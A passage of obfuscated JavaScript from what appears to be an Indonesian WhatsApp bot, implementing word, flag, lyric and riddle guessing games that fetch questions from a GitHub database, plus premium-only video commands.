                'quoted': _0x1b1e88
            }), _0x252a88, 0xfa, setTimeout(() => {
                const _0x248ca3 = _0x5804c8;
                if (tebakgame[_0x1b1e88[_0x248ca3(0x60f)]]) {
                    return _0x358f3b(_0x539017(_0x252a88[_0x248ca3(0xcdf)]), _0xec783b, _0x1b1e88);
                    delete tebakgame[_0x1b1e88[_0x248ca3(0x60f)]];
                }
            }, 0x1d4c0)];
        }
        break;
        case 'tegem': {
            if (_0x4343cd) return _0x358f3b(_0x5804c8(0x6d2));
            if (!(_0x1b1e88['chat'] in tebakgame)) return;
            let _0x3195ec = tebakgame[_0x1b1e88[_0x5804c8(0x60f)]][0x1];
            _0x614da8[_0x5804c8(0xbe3)](_0x1b1e88[_0x5804c8(0x60f)], _0x5804c8(0xd16) + _0x3195ec['name']['replace'](/[bcdfghjklmnpqrstvwxyz]/ig, '_') + _0x5804c8(0xd16), _0xec783b, _0x5804c8(0x1e4), _0x5804c8(0x827), _0x1b1e88);
        }
        break;
        case _0x5804c8(0xd98): {
            if (_0x4343cd) return _0x358f3b(_0x5804c8(0x6d2));
            if (!(_0x1b1e88[_0x5804c8(0x60f)] in tebakgame)) return;
            return clearTimeout(tebakgame[_0x1b1e88[_0x5804c8(0x60f)]][0x3]), delete tebakgame[_0x1b1e88[_0x5804c8(0x60f)]], _0x614da8['sendMessage'](_0x1b1e88[_0x5804c8(0x60f)], {
                'text': '_*Lemahh Gitu Doang Nyerah*_ 😏'
            }, {
                'quoted': _0x51e31f
            });
        }
        break;
        case _0x5804c8(0xab4): {
            if (_0x4343cd) return _0x358f3b(_0x5804c8(0x6d2));
            if (tebakkata[_0x1b1e88[_0x5804c8(0x60f)]]) return _0x614da8['sendMessage'](_0x1b1e88[_0x5804c8(0x60f)], {
                'text': _0x5804c8(0x8d3)
            }, {
                'quoted': tebakkata[_0x1b1e88[_0x5804c8(0x60f)]][0x0]
            });
            let _0x2e8ce7 = await fetchJson('https://raw.githubusercontent.com/BochilTeam/database/master/games/tebakkata.json'),
                _0x3fc792 = _0x2e8ce7[Math['floor'](Math[_0x5804c8(0xbbf)]() * _0x2e8ce7[_0x5804c8(0x977)])];
            console['log'](_0x5804c8(0xd07) + _0x3fc792[_0x5804c8(0xcdf)]), tebakkata[_0x1b1e88[_0x5804c8(0x60f)]] = [await _0x614da8[_0x5804c8(0x4aa)](_0x1b1e88[_0x5804c8(0x60f)], _0x5804c8(0x564) + _0x3fc792[_0x5804c8(0xb0e)] + '\x0aWaktu : ' + (0x1d4c0 / 0x3e8)[_0x5804c8(0xac7)](0x2) + _0x5804c8(0xc65), _0x1b1e88), _0x3fc792, 0xfa, setTimeout(() => {
                const _0x29046d = _0x5804c8;
                if (tebakkata[_0x1b1e88[_0x29046d(0x60f)]]) {
                    return _0x358f3b(_0x539017(_0x3fc792['jawaban']), _0xec783b, _0x1b1e88);
                    delete tebakkata[_0x1b1e88[_0x29046d(0x60f)]];
                }
            }, 0x1d4c0)];
        }
        break;
        case 'family100': {
            if (_0x4343cd) return _0x358f3b(_0x5804c8(0x6d2));
            if (!_0x1b1e88[_0x5804c8(0xcea)]) return _0x358f3b(mess[_0x5804c8(0xb42)]);
            if ('family100' + _0x1b1e88[_0x5804c8(0x60f)] in _family100) {
                _0x1b1e88[_0x5804c8(0x322)](_0x5804c8(0x212));
                throw ![];
            }
            let _0x22c3e5 = await fetchJson(_0x5804c8(0x4a4)),
                _0x47730f = _0x22c3e5[Math['floor'](Math[_0x5804c8(0xbbf)]() * _0x22c3e5[_0x5804c8(0x977)])],
                _0x127dc2 = (_0x5804c8(0x945) + _0x47730f['soal'] + _0x5804c8(0x8c2) + _0x47730f[_0x5804c8(0xcdf)][_0x5804c8(0x977)] + '* Jawaban ' + (_0x47730f[_0x5804c8(0xcdf)][_0x5804c8(0x958)](_0x1e5a82 => _0x1e5a82[_0x5804c8(0x34b)](' ')) ? _0x5804c8(0x9ab) : ''))[_0x5804c8(0xd5d)]();
            _family100[_0x5804c8(0x565) + _0x1b1e88['chat']] = {
                'id': 'family100' + _0x1b1e88['chat'],
                'pesan': await _0x614da8[_0x5804c8(0x4aa)](_0x1b1e88['chat'], _0x127dc2, _0x1b1e88),
                ..._0x47730f,
                'terjawab': Array[_0x5804c8(0x44e)](_0x47730f[_0x5804c8(0xcdf)], () => ![]),
                'hadiah': 0x6
            };
        }
        break;
        case 'teka': {
            if (_0x4343cd) return _0x358f3b(_0x5804c8(0x6d2));
            if (!(_0x1b1e88[_0x5804c8(0x60f)] in tebakkata)) return;
            let _0x3d5297 = tebakkata[_0x1b1e88[_0x5804c8(0x60f)]][0x1];
            _0x614da8[_0x5804c8(0xbe3)](_0x1b1e88[_0x5804c8(0x60f)], _0x5804c8(0xd16) + _0x3d5297['jawaban'][_0x5804c8(0xa72)](/[bcdfghjklmnpqrstvwxyz]/ig, '_') + _0x5804c8(0xd16), _0xec783b, _0x5804c8(0x2b2), 'Dahlah Nyerah Aja✌️', _0x1b1e88);
        }
        break;
        case _0x5804c8(0x1ca): {
            if (_0x4343cd) return _0x358f3b(_0x5804c8(0x6d2));
            if (!(_0x1b1e88[_0x5804c8(0x60f)] in tebakkata)) return;
            return clearTimeout(tebakkata[_0x1b1e88['chat']][0x3]), delete tebakkata[_0x1b1e88[_0x5804c8(0x60f)]], _0x614da8[_0x5804c8(0x938)](_0x1b1e88[_0x5804c8(0x60f)], {
                'text': _0x5804c8(0x824)
            }, {
                'quoted': _0x51e31f
            });
        }
        break;
        case _0x5804c8(0x7ee): {
            if (_0x4343cd) return _0x358f3b('Lu di ban kocak awokwok');
            if (tebakbendera[_0x1b1e88[_0x5804c8(0x60f)]]) return _0x614da8[_0x5804c8(0x938)](_0x1b1e88[_0x5804c8(0x60f)], {
                'text': _0x5804c8(0x8d3)
            }, {
                'quoted': tebakbendera[_0x1b1e88[_0x5804c8(0x60f)]][0x0]
            });
            let _0x15e2a2 = await fetchJson(_0x5804c8(0xacc)),
                _0x254133 = _0x15e2a2[Math['floor'](Math[_0x5804c8(0xbbf)]() * _0x15e2a2[_0x5804c8(0x977)])];
            console['log']('Jawaban: ' + _0x254133['name']), tebakbendera[_0x1b1e88[_0x5804c8(0x60f)]] = [await _0x614da8[_0x5804c8(0x938)](_0x1b1e88[_0x5804c8(0x60f)], {
                'image': {
                    'url': _0x254133[_0x5804c8(0x8f7)]
                },
                'caption': _0x5804c8(0x6c2) + (0x1d4c0 / 0x3e8)[_0x5804c8(0xac7)](0x2) + _0x5804c8(0xc65)
            }, {
                'quoted': _0x1b1e88
            }), _0x254133, 0xfa, setTimeout(() => {
                const _0x180bdd = _0x5804c8;
                if (tebakbendera[_0x1b1e88['chat']]) {
                    return _0x358f3b(_0x539017(_0x254133[_0x180bdd(0x35b)]), _0xec783b, _0x1b1e88);
                    delete tebakbendera[_0x1b1e88[_0x180bdd(0x60f)]];
                }
            }, 0x1d4c0)];
        }
        break;
        case _0x5804c8(0xbab): {
            if (_0x4343cd) return _0x358f3b(_0x5804c8(0x6d2));
            if (!(_0x1b1e88[_0x5804c8(0x60f)] in tebakbendera)) return;
            let _0x47b26a = tebakbendera[_0x1b1e88[_0x5804c8(0x60f)]][0x1];
            _0x614da8[_0x5804c8(0xbe3)](_0x1b1e88[_0x5804c8(0x60f)], _0x5804c8(0xd16) + _0x47b26a[_0x5804c8(0x35b)][_0x5804c8(0xa72)](/[bcdfghjklmnpqrstvwxyz]/ig, '_') + _0x5804c8(0xd16), _0xec783b, '.ytebe', _0x5804c8(0x827), _0x1b1e88);
        }
        break;
        case _0x5804c8(0x4b7): {
            if (_0x4343cd) return _0x358f3b(_0x5804c8(0x6d2));
            if (!(_0x1b1e88[_0x5804c8(0x60f)] in tebakbendera)) return;
            return clearTimeout(tebakbendera[_0x1b1e88[_0x5804c8(0x60f)]][0x3]), delete tebakbendera[_0x1b1e88[_0x5804c8(0x60f)]], _0x614da8['sendMessage'](_0x1b1e88['chat'], {
                'text': '_*Lemahh Gitu Doang Nyerah*_ 😏'
            }, {
                'quoted': _0x51e31f
            });
        }
        break;
        case _0x5804c8(0x545): {
            if (_0x4343cd) return _0x358f3b(_0x5804c8(0x6d2));
            if (tebakkalimat[_0x1b1e88['chat']]) return _0x614da8[_0x5804c8(0x938)](_0x1b1e88[_0x5804c8(0x60f)], {
                'text': 'Soal ini belum selesai'
            }, {
                'quoted': tebakkalimat[_0x1b1e88[_0x5804c8(0x60f)]][0x0]
            });
            let _0x2232df = await fetchJson(_0x5804c8(0x99a)),
                _0x5cf4cd = _0x2232df[Math['floor'](Math['random']() * _0x2232df[_0x5804c8(0x977)])];
            console[_0x5804c8(0xcd3)]('Jawaban: ' + _0x5cf4cd[_0x5804c8(0xcdf)]), tebakkalimat[_0x1b1e88[_0x5804c8(0x60f)]] = [await _0x614da8['sendText'](_0x1b1e88[_0x5804c8(0x60f)], 'Silahkan Jawab Pertanyaan Berikut\x0a\x0a' + _0x5cf4cd[_0x5804c8(0xb0e)] + _0x5804c8(0x447) + (0x1d4c0 / 0x3e8)[_0x5804c8(0xac7)](0x2) + _0x5804c8(0xc65), _0x1b1e88), _0x5cf4cd, 0xfa, setTimeout(() => {
                const _0x58a790 = _0x5804c8;
                if (tebakkalimat[_0x1b1e88[_0x58a790(0x60f)]]) {
                    return _0x358f3b(_0x539017(_0x5cf4cd[_0x58a790(0xcdf)]), _0xec783b, _0x1b1e88);
                    delete tebakkalimat[_0x1b1e88[_0x58a790(0x60f)]];
                }
            }, 0x1d4c0)];
        }
        break;
        case _0x5804c8(0x4b0): {
            if (_0x4343cd) return _0x358f3b(_0x5804c8(0x6d2));
            if (!(_0x1b1e88[_0x5804c8(0x60f)] in tebakkalimat)) return;
            let _0xf976f6 = tebakkalimat[_0x1b1e88['chat']][0x1];
            _0x614da8[_0x5804c8(0xbe3)](_0x1b1e88[_0x5804c8(0x60f)], _0x5804c8(0xd16) + _0xf976f6['jawaban'][_0x5804c8(0xa72)](/[bcdfghjklmnpqrstvwxyz]/ig, '_') + '```', _0xec783b, '.ytekatu', 'Dahlah Nyerah Aja✌️', _0x1b1e88);
        }
        break;
        case _0x5804c8(0x303): {
            if (_0x4343cd) return _0x358f3b(_0x5804c8(0x6d2));
            if (!(_0x1b1e88[_0x5804c8(0x60f)] in tebakkalimat)) return;
            return clearTimeout(tebakkalimat[_0x1b1e88[_0x5804c8(0x60f)]][0x3]), delete tebakkalimat[_0x1b1e88[_0x5804c8(0x60f)]], _0x614da8[_0x5804c8(0x938)](_0x1b1e88['chat'], {
                'text': _0x5804c8(0x824)
            }, {
                'quoted': _0x51e31f
            });
        }
        break;
        case _0x5804c8(0x6fc): {
            if (_0x4343cd) return _0x358f3b(_0x5804c8(0x6d2));
            if (siapaaku[_0x1b1e88[_0x5804c8(0x60f)]]) return _0x614da8[_0x5804c8(0x938)](_0x1b1e88[_0x5804c8(0x60f)], {
                'text': _0x5804c8(0x8d3)
            }, {
                'quoted': siapaaku[_0x1b1e88[_0x5804c8(0x60f)]][0x0]
            });
            let _0x1f77b6 = await fetchJson('https://raw.githubusercontent.com/BochilTeam/database/master/games/siapakahaku.json'),
                _0x271650 = _0x1f77b6[Math['floor'](Math[_0x5804c8(0xbbf)]() * _0x1f77b6['length'])];
            console['log'](_0x5804c8(0xd07) + _0x271650['jawaban']), siapaaku[_0x1b1e88[_0x5804c8(0x60f)]] = [await _0x614da8['sendText'](_0x1b1e88[_0x5804c8(0x60f)], _0x5804c8(0x564) + _0x271650[_0x5804c8(0xb0e)] + '\x0aWaktu : ' + (0x1d4c0 / 0x3e8)['toFixed'](0x2) + _0x5804c8(0xc65), _0x1b1e88), _0x271650, 0xfa, setTimeout(() => {
                const _0xfeceb6 = _0x5804c8;
                if (siapaaku[_0x1b1e88[_0xfeceb6(0x60f)]]) {
                    return _0x358f3b(_0x539017(_0x271650['jawaban']), _0xec783b, _0x1b1e88);
                    delete siapaaku[_0x1b1e88[_0xfeceb6(0x60f)]];
                }
            }, 0x1d4c0)];
        }
        break;
        case _0x5804c8(0x2b1): {
            if (_0x4343cd) return _0x358f3b('Lu di ban kocak awokwok');
            if (!(_0x1b1e88[_0x5804c8(0x60f)] in siapaaku)) return;
            let _0x24bcc2 = siapaaku[_0x1b1e88[_0x5804c8(0x60f)]][0x1];
            _0x614da8['send1ButMes'](_0x1b1e88[_0x5804c8(0x60f)], '```' + _0x24bcc2[_0x5804c8(0xcdf)][_0x5804c8(0xa72)](/[bcdfghjklmnpqrstvwxyz]/ig, '_') + '```', _0xec783b, _0x5804c8(0x1a1), _0x5804c8(0x827), _0x1b1e88);
        }
        break;
        case _0x5804c8(0x2be): {
            if (_0x4343cd) return _0x358f3b(_0x5804c8(0x6d2));
            if (!(_0x1b1e88[_0x5804c8(0x60f)] in siapaaku)) return;
            return clearTimeout(siapaaku[_0x1b1e88[_0x5804c8(0x60f)]][0x3]), delete siapaaku[_0x1b1e88[_0x5804c8(0x60f)]], _0x614da8[_0x5804c8(0x938)](_0x1b1e88[_0x5804c8(0x60f)], {
                'text': _0x5804c8(0x824)
            }, {
                'quoted': _0x51e31f
            });
        }
        break;
        case _0x5804c8(0x85c): {
            if (_0x4343cd) return _0x358f3b(_0x5804c8(0x6d2));
            if (tebakkimia[_0x1b1e88[_0x5804c8(0x60f)]]) return _0x614da8[_0x5804c8(0x938)](_0x1b1e88['chat'], {
                'text': _0x5804c8(0x8d3)
            }, {
                'quoted': tebakkimia[_0x1b1e88[_0x5804c8(0x60f)]][0x0]
            });
            let _0x2316bc = await fetchJson(_0x5804c8(0x7dc)),
                _0x288341 = _0x2316bc[Math[_0x5804c8(0xa2b)](Math[_0x5804c8(0xbbf)]() * _0x2316bc[_0x5804c8(0x977)])];
            console['log']('Jawaban: ' + _0x288341[_0x5804c8(0x86a)]), tebakkimia[_0x1b1e88[_0x5804c8(0x60f)]] = [await _0x614da8[_0x5804c8(0x4aa)](_0x1b1e88[_0x5804c8(0x60f)], _0x5804c8(0x1b0) + _0x288341['lambang'] + _0x5804c8(0x187) + (0x1d4c0 / 0x3e8)[_0x5804c8(0xac7)](0x2) + _0x5804c8(0xc65), _0x1b1e88), _0x288341, 0xfa, setTimeout(() => {
                const _0x15c9d3 = _0x5804c8;
                if (tebakkimia[_0x1b1e88[_0x15c9d3(0x60f)]]) {
                    return _0x358f3b(_0x539017(_0x288341[_0x15c9d3(0x86a)]), _0xec783b, _0x1b1e88);
                    delete tebakkimia[_0x1b1e88['chat']];
                }
            }, 0x1d4c0)];
        }
        break;
        case _0x5804c8(0x4b5): {
            if (_0x4343cd) return _0x358f3b(_0x5804c8(0x6d2));
            if (!(_0x1b1e88[_0x5804c8(0x60f)] in tebakkimia)) return;
            let _0xaba95a = tebakkimia[_0x1b1e88['chat']][0x1];
            _0x614da8[_0x5804c8(0xbe3)](_0x1b1e88[_0x5804c8(0x60f)], '```' + _0xaba95a[_0x5804c8(0x86a)][_0x5804c8(0xa72)](/[bcdfghjklmnpqrstvwxyz]/ig, '_') + _0x5804c8(0xd16), _0xec783b, _0x5804c8(0x340), _0x5804c8(0x827), _0x1b1e88);
        }
        break;
        case _0x5804c8(0x91f): {
            if (_0x4343cd) return _0x358f3b(_0x5804c8(0x6d2));
            if (!(_0x1b1e88[_0x5804c8(0x60f)] in tebakkimia)) return;
            return clearTimeout(tebakkimia[_0x1b1e88[_0x5804c8(0x60f)]][0x3]), delete tebakkimia[_0x1b1e88[_0x5804c8(0x60f)]], _0x614da8[_0x5804c8(0x938)](_0x1b1e88[_0x5804c8(0x60f)], {
                'text': _0x5804c8(0x824)
            }, {
                'quoted': _0x51e31f
            });
        }
        break;
        case 'tebaklirik': {
            if (_0x4343cd) return _0x358f3b(_0x5804c8(0x6d2));
            if (tebaklirik[_0x1b1e88['chat']]) return _0x614da8[_0x5804c8(0x938)](_0x1b1e88['chat'], {
                'text': _0x5804c8(0x8d3)
            }, {
                'quoted': tebaklirik[_0x1b1e88[_0x5804c8(0x60f)]][0x0]
            });
            let _0x34680e = await fetchJson(_0x5804c8(0x890)),
                _0x2f3b9e = _0x34680e[Math[_0x5804c8(0xa2b)](Math[_0x5804c8(0xbbf)]() * _0x34680e[_0x5804c8(0x977)])];
            console['log'](_0x5804c8(0xd07) + _0x2f3b9e[_0x5804c8(0xcdf)]), tebaklirik[_0x1b1e88[_0x5804c8(0x60f)]] = [await _0x614da8[_0x5804c8(0x4aa)](_0x1b1e88[_0x5804c8(0x60f)], _0x5804c8(0xcf2) + _0x2f3b9e[_0x5804c8(0xb0e)] + '*?\x0aWaktu : ' + (0x1d4c0 / 0x3e8)[_0x5804c8(0xac7)](0x2) + _0x5804c8(0xc65), _0x1b1e88), _0x2f3b9e, 0xfa, setTimeout(() => {
                const _0x38735c = _0x5804c8;
                if (tebaklirik[_0x1b1e88[_0x38735c(0x60f)]]) {
                    return _0x358f3b(_0x539017(_0x2f3b9e[_0x38735c(0xcdf)]), _0xec783b, _0x1b1e88);
                    delete tebaklirik[_0x1b1e88[_0x38735c(0x60f)]];
                }
            }, 0x1d4c0)];
        }
        break;
        case _0x5804c8(0x2a8): {
            if (_0x4343cd) return _0x358f3b(_0x5804c8(0x6d2));
            if (!(_0x1b1e88[_0x5804c8(0x60f)] in tebaklirik)) return;
            let _0x14a3ed = tebaklirik[_0x1b1e88[_0x5804c8(0x60f)]][0x1];
            _0x614da8['send1ButMes'](_0x1b1e88[_0x5804c8(0x60f)], _0x5804c8(0xd16) + _0x14a3ed['jawaban'][_0x5804c8(0xa72)](/[bcdfghjklmnpqrstvwxyz]/ig, '_') + _0x5804c8(0xd16), _0xec783b, _0x5804c8(0x511), 'Dahlah Nyerah Aja✌️', _0x1b1e88);
        }
        break;
        case _0x5804c8(0xb66): {
            if (_0x4343cd) return _0x358f3b(_0x5804c8(0x6d2));
            if (!(_0x1b1e88[_0x5804c8(0x60f)] in tebaklirik)) return;
            return clearTimeout(tebaklirik[_0x1b1e88[_0x5804c8(0x60f)]][0x3]), delete tebaklirik[_0x1b1e88[_0x5804c8(0x60f)]], _0x614da8[_0x5804c8(0x938)](_0x1b1e88['chat'], {
                'text': _0x5804c8(0x824)
            }, {
                'quoted': _0x51e31f
            });
        }
        break;
        case _0x5804c8(0xc49): {
            if (_0x4343cd) return _0x358f3b('Lu di ban kocak awokwok');
            if (tebaktebakan[_0x1b1e88[_0x5804c8(0x60f)]]) return _0x614da8[_0x5804c8(0x938)](_0x1b1e88[_0x5804c8(0x60f)], {
                'text': _0x5804c8(0x8d3)
            }, {
                'quoted': tebaktebakan[_0x1b1e88['chat']][0x0]
            });
            let _0xbf8ae1 = await fetchJson(_0x5804c8(0x1be)),
                _0x4b0d3d = _0xbf8ae1[Math[_0x5804c8(0xa2b)](Math[_0x5804c8(0xbbf)]() * _0xbf8ae1[_0x5804c8(0x977)])];
            console[_0x5804c8(0xcd3)]('Jawaban: ' + _0x4b0d3d['jawaban']), tebaktebakan[_0x1b1e88['chat']] = [await _0x614da8[_0x5804c8(0x4aa)](_0x1b1e88[_0x5804c8(0x60f)], _0x5804c8(0x564) + _0x4b0d3d['soal'] + _0x5804c8(0x447) + (0x1d4c0 / 0x3e8)['toFixed'](0x2) + _0x5804c8(0xc65), _0x1b1e88), _0x4b0d3d, 0xfa, setTimeout(() => {
                const _0x3507f5 = _0x5804c8;
                if (tebaktebakan[_0x1b1e88['chat']]) {
                    return _0x358f3b(_0x539017(_0x4b0d3d[_0x3507f5(0xcdf)]), _0xec783b, _0x1b1e88);
                    delete tebaktebakan[_0x1b1e88[_0x3507f5(0x60f)]];
                }
            }, 0x1d4c0)];
        }
        break;
        case _0x5804c8(0x3a5): {
            if (_0x4343cd) return _0x358f3b(_0x5804c8(0x6d2));
            if (!(_0x1b1e88[_0x5804c8(0x60f)] in tebaktebakan)) return;
            let _0x46ab93 = tebaktebakan[_0x1b1e88[_0x5804c8(0x60f)]][0x1];
            _0x614da8[_0x5804c8(0xbe3)](_0x1b1e88[_0x5804c8(0x60f)], _0x5804c8(0xd16) + _0x46ab93[_0x5804c8(0xcdf)][_0x5804c8(0xa72)](/[bcdfghjklmnpqrstvwxyz]/ig, '_') + _0x5804c8(0xd16), _0xec783b, '.yteteb', _0x5804c8(0x827), _0x1b1e88);
        }
        break;
        case 'yteteb': {
            if (_0x4343cd) return _0x358f3b(_0x5804c8(0x6d2));
            if (!(_0x1b1e88['chat'] in tebaktebakan)) return;
            return clearTimeout(tebaktebakan[_0x1b1e88[_0x5804c8(0x60f)]][0x3]), delete tebaktebakan[_0x1b1e88['chat']], _0x614da8[_0x5804c8(0x938)](_0x1b1e88[_0x5804c8(0x60f)], {
                'text': _0x5804c8(0x824)
            }, {
                'quoted': _0x51e31f
            });
        }
        break;
        case _0x5804c8(0x169): {
            if (_0x4343cd) return _0x358f3b('Lu di ban kocak awokwok');
            if (susunkata[_0x1b1e88[_0x5804c8(0x60f)]]) return _0x614da8[_0x5804c8(0x938)](_0x1b1e88['chat'], {
                'text': 'Soal ini belum selesai'
            }, {
                'quoted': susunkata[_0x1b1e88[_0x5804c8(0x60f)]][0x0]
            });
            let _0x119425 = await fetchJson(_0x5804c8(0x5f0)),
                _0x4c606a = _0x119425[Math['floor'](Math['random']() * _0x119425['length'])];
            console[_0x5804c8(0xcd3)]('Jawaban: ' + _0x4c606a[_0x5804c8(0xcdf)]), susunkata[_0x1b1e88[_0x5804c8(0x60f)]] = [await _0x614da8[_0x5804c8(0x4aa)](_0x1b1e88[_0x5804c8(0x60f)], _0x5804c8(0x742) + _0x4c606a[_0x5804c8(0xb0e)] + _0x5804c8(0xceb) + _0x4c606a[_0x5804c8(0x406)] + _0x5804c8(0x447) + (0x1d4c0 / 0x3e8)[_0x5804c8(0xac7)](0x2) + ' detik', _0x1b1e88), _0x4c606a, 0xfa, setTimeout(() => {
                const _0x2ca745 = _0x5804c8;
                if (susunkata[_0x1b1e88[_0x2ca745(0x60f)]]) {
                    return _0x358f3b(_0x539017(_0x4c606a[_0x2ca745(0xcdf)]), _0xec783b, _0x1b1e88);
                    delete susunkata[_0x1b1e88[_0x2ca745(0x60f)]];
                }
            }, 0x1d4c0)];
        }
        break;
        case _0x5804c8(0x69a): {
            if (_0x4343cd) return _0x358f3b(_0x5804c8(0x6d2));
            if (!(_0x1b1e88[_0x5804c8(0x60f)] in susunkata)) return;
            let _0x2ca119 = susunkata[_0x1b1e88[_0x5804c8(0x60f)]][0x1];
            _0x614da8[_0x5804c8(0xbe3)](_0x1b1e88['chat'], '```' + _0x2ca119[_0x5804c8(0xcdf)][_0x5804c8(0xa72)](/[bcdfghjklmnpqrstvwxyz]/ig, '_') + _0x5804c8(0xd16), _0xec783b, _0x5804c8(0x962), 'Dahlah Nyerah Aja✌️', _0x1b1e88);
        }
        break;
        case _0x5804c8(0xb97): {
            if (_0x4343cd) return _0x358f3b(_0x5804c8(0x6d2));
            if (!(_0x1b1e88[_0x5804c8(0x60f)] in susunkata)) return;
            return clearTimeout(susunkata[_0x1b1e88[_0x5804c8(0x60f)]][0x3]), delete susunkata[_0x1b1e88[_0x5804c8(0x60f)]], _0x614da8['sendMessage'](_0x1b1e88['chat'], {
                'text': _0x5804c8(0x824)
            }, {
                'quoted': _0x51e31f
            });
        }
        break;
        case _0x5804c8(0x311): {
            if (_0x4343cd) return _0x358f3b(_0x5804c8(0x6d2));
            if (caklontong[_0x1b1e88['chat']]) return _0x614da8['sendMessage'](_0x1b1e88['chat'], {
                'text': _0x5804c8(0x8d3)
            }, {
                'quoted': caklontong[_0x1b1e88[_0x5804c8(0x60f)]][0x0]
            });
            let _0x5d7945 = await fetchJson(_0x5804c8(0xb55)),
                _0x30a985 = _0x5d7945[Math[_0x5804c8(0xa2b)](Math[_0x5804c8(0xbbf)]() * _0x5d7945[_0x5804c8(0x977)])];
            console[_0x5804c8(0xcd3)](_0x5804c8(0xd07) + _0x30a985[_0x5804c8(0xcdf)]), caklontong[_0x1b1e88[_0x5804c8(0x60f)]] = [await _0x614da8['sendText'](_0x1b1e88[_0x5804c8(0x60f)], _0x5804c8(0x742) + _0x30a985['soal'] + _0x5804c8(0x447) + (0x1d4c0 / 0x3e8)[_0x5804c8(0xac7)](0x2) + _0x5804c8(0x39a), _0x1b1e88), _0x30a985, 0xfa, setTimeout(() => {
                const _0x37b27f = _0x5804c8;
                if (caklontong[_0x1b1e88[_0x37b27f(0x60f)]]) {
                    return _0x358f3b(_0x539017(_0x30a985[_0x37b27f(0xcdf)]), _0xec783b, _0x1b1e88);
                    delete caklontong[_0x1b1e88[_0x37b27f(0x60f)]];
                }
            }, 0x1d4c0)];
        }
        break;
        case _0x5804c8(0xb0c): {
            if (_0x4343cd) return _0x358f3b(_0x5804c8(0x6d2));
            if (!(_0x1b1e88['chat'] in caklontong)) return;
            let _0xbd38f = caklontong[_0x1b1e88[_0x5804c8(0x60f)]][0x1];
            _0x614da8[_0x5804c8(0xbe3)](_0x1b1e88[_0x5804c8(0x60f)], _0x5804c8(0xd16) + _0xbd38f[_0x5804c8(0xcdf)][_0x5804c8(0xa72)](/[bcdfghjklmnpqrstvwxyz]/ig, '_') + _0x5804c8(0xd16), _0xec783b, '.ytelo', _0x5804c8(0x827), _0x1b1e88);
        }
        break;
        case _0x5804c8(0xc61): {
            if (_0x4343cd) return _0x358f3b(_0x5804c8(0x6d2));
            if (!(_0x1b1e88[_0x5804c8(0x60f)] in caklontong)) return;
            return clearTimeout(caklontong[_0x1b1e88[_0x5804c8(0x60f)]][0x3]), delete caklontong[_0x1b1e88[_0x5804c8(0x60f)]], _0x614da8[_0x5804c8(0x938)](_0x1b1e88[_0x5804c8(0x60f)], {
                'text': '_*Lemahh Gitu Doang Nyerah*_ 😏'
            }, {
                'quoted': _0x51e31f
            });
        }
        break;
        case 'tekateki': {
            if (_0x4343cd) return _0x358f3b(_0x5804c8(0x6d2));
            if (tekateki[_0x1b1e88['chat']]) return _0x614da8['sendMessage'](_0x1b1e88['chat'], {
                'text': _0x5804c8(0x8d3)
            }, {
                'quoted': tekateki[_0x1b1e88['chat']][0x0]
            });
            let _0x17efd4 = await fetchJson(_0x5804c8(0x5d8)),
                _0x384891 = _0x17efd4[Math['floor'](Math[_0x5804c8(0xbbf)]() * _0x17efd4['length'])];
            console[_0x5804c8(0xcd3)](_0x5804c8(0xd07) + _0x384891['jawaban']), tekateki[_0x1b1e88['chat']] = [await _0x614da8['sendText'](_0x1b1e88[_0x5804c8(0x60f)], 'Silahkan Jawab Pertanyaan Berikut\x0a\x0a' + _0x384891['soal'] + _0x5804c8(0x447) + (0x1d4c0 / 0x3e8)[_0x5804c8(0xac7)](0x2) + _0x5804c8(0xc65), _0x1b1e88), _0x384891, 0xfa, setTimeout(() => {
                const _0xd0104b = _0x5804c8;
                if (tekateki[_0x1b1e88['chat']]) {
                    return _0x358f3b(_0x539017(_0x384891[_0xd0104b(0xcdf)]), _0xec783b, _0x1b1e88);
                    delete tekateki[_0x1b1e88['chat']];
                }
            }, 0x1d4c0)];
        }
        break;
        case _0x5804c8(0x1e2): {
            if (_0x4343cd) return _0x358f3b(_0x5804c8(0x6d2));
            if (!(_0x1b1e88[_0x5804c8(0x60f)] in tekateki)) return;
            let _0x46c33a = tekateki[_0x1b1e88[_0x5804c8(0x60f)]][0x1];
            _0x614da8[_0x5804c8(0xbe3)](_0x1b1e88['chat'], _0x5804c8(0xd16) + _0x46c33a[_0x5804c8(0xcdf)]['replace'](/[bcdfghjklmnpqrstvwxyz]/ig, '_') + _0x5804c8(0xd16), _0xec783b, _0x5804c8(0x18d), _0x5804c8(0x827), _0x1b1e88);
        }
        break;
        case _0x5804c8(0x7cf): {
            if (_0x4343cd) return _0x358f3b(_0x5804c8(0x6d2));
            if (!(_0x1b1e88['chat'] in tekateki)) return;
            return clearTimeout(tekateki[_0x1b1e88['chat']][0x3]), delete tekateki[_0x1b1e88[_0x5804c8(0x60f)]], _0x614da8[_0x5804c8(0x938)](_0x1b1e88[_0x5804c8(0x60f)], {
                'text': _0x5804c8(0x824)
            }, {
                'quoted': _0x51e31f
            });
        }
        break;
        case _0x5804c8(0x3c0):
        case _0x5804c8(0x4a1):
        case _0x5804c8(0x657):
        case _0x5804c8(0xa19):
        case 'santuy':
        case 'ukhty':
        case _0x5804c8(0x8dc):
        case _0x5804c8(0x547):
        case 'ayu':
        case _0x5804c8(0x868):
        case _0x5804c8(0x71a):
        case 'nisa':
        case 'ziva':
        case _0x5804c8(0x78b):
        case 'viona':
        case _0x5804c8(0x7d6):
        case _0x5804c8(0x148):
        case _0x5804c8(0x22f):
        case _0x5804c8(0x2fd):
        case _0x5804c8(0xc64):
        case _0x5804c8(0x46d): {
            if (_0x4343cd) return _0x358f3b(_0x5804c8(0x6d2));
            if (!_0x7b6ab6 && !_0x75f0ff) return _0x358f3b(mess[_0x5804c8(0x8f0)]);
            _0x358f3b(mess[_0x5804c8(0x135)]), _0x614da8[_0x5804c8(0x938)](_0x1b1e88[_0x5804c8(0x60f)], {
                'video': {
                    'url': _0x5804c8(0x991) + _0x453fc1 + _0x5804c8(0x45b) + _0x932571[_0x5804c8(0xc67)],
                    'mimetype': _0x5804c8(0x280)
                },
                'caption': _0x5804c8(0x659)
            }, {
                'quoted': _0x1b1e88
            })[_0x5804c8(0xb9d)](_0xed0ed4 => {
                _0x358f3b(util['format'](_0xed0ed4));
            });
        }
        break;
        case _0x5804c8(0xbf7):
        case _0x5804c8(0xa7e):
        case _0x5804c8(0x9c9):
        case _0x5804c8(0x161):
        case _0x5804c8(0x56b):
        case _0x5804c8(0x435):
        case _0x5804c8(0xa87): {
            if (_0x4343cd) return _0x358f3b(_0x5804c8(0x6d2));
            if (!_0x7b6ab6 && !_0x75f0ff) return _0x358f3b(mess['OnlyPrem']);
